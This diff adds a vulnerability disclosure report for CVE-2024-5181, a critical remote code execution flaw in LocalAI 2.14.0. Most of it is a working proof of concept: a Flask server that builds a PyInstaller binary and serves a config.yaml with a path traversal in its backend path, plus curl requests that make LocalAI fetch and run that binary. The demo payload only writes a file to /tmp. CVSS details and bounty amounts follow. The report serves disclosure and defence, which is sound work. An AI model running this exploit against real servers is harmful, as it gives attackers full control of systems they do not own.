@@ -1,0 +1,85 @@
+Title: Command Injection in mudler/localai
+
+Proof of Concept: 
+Save this code as exploit.py
+
+from flask import Flask,send_file,request
+import tempfile
+import PyInstaller.__main__
+import os
+import hashlib
+
+app=Flask(__name__)
+
+CONF="""name: "ptest"
+backend: ../../../../../../../../../build/models/{0}
+parameters:
+  model: {1}app.bin
+
+usage: |
+    You can test this model with curl like this:
+
+    test
+"""
+
+# Builds exploit code
+def build():
+    CODE = 'open("/tmp/test.txt","a").write("1337")' # Python code we want to run
+    appname="app.bin"
+    if os.path.isfile(appname):
+        return appname
+    with tempfile.NamedTemporaryFile(delete=False) as fp:
+        fp.write(CODE.encode())
+        fp.close()
+        PyInstaller.__main__.run(["--onefile","--clean","--workpath","/tmp/build/","--specpath","/tmp","--distpath",".","-n",appname,fp.name])
+    return appname
+
+# localAI stores the application we built by renaming it. This name is the md5 of the url. Here this value is calculated
+def calc_urlhash():
+    url=request.root_url or ""
+    url = url if url.endswith("/") else url+"/"
+    return hashlib.md5((url + "app.bin").encode()).hexdigest() ,url
+
+# Serve config.yaml file
+@app.get("/config.yaml")
+def config():
+    hash,url=calc_urlhash()
+    return CONF.format(hash,url)
+
+# Serve app.bin file
+@app.get("/app.bin")
+def files():
+    return send_file(build())
+
+
+# Start the server
+app.run("0.0.0.0",8000)
+
+Run the exploit serverpython3 exploit.py
+
+curl http://localhost:8080/models/apply -X POST -H "Content-Type: application/json" -d '{"config_url":"<exploit_server_url>/config.yaml","id":""}'
+
+curl http://localhost:8080/embeddings -X POST -H "Content-Type:application/json" -d '{ "input": "Your text string goes here", "model": "ptest" }'
+As a result of this request, you will receive the following response with a response code of 500 "grpc service not ready". This means that the exploit is successful. When you look at the tmp folder on the system where the application is running, you will see the test.txt file.
+
+Impact: 
+Allows the attacker to execute malicious code, gaining full control over the system.
+
+CVE ID: CVE-2024-5181
+Status: (published)
+Vulnerability Type: CWE-78: OS Command Injection
+Severity: Critical (9.8)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: High
+Availability: High
+Registry: Golang
+Affected Version: 2.14.0
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $900
+Fix Bounty: $225
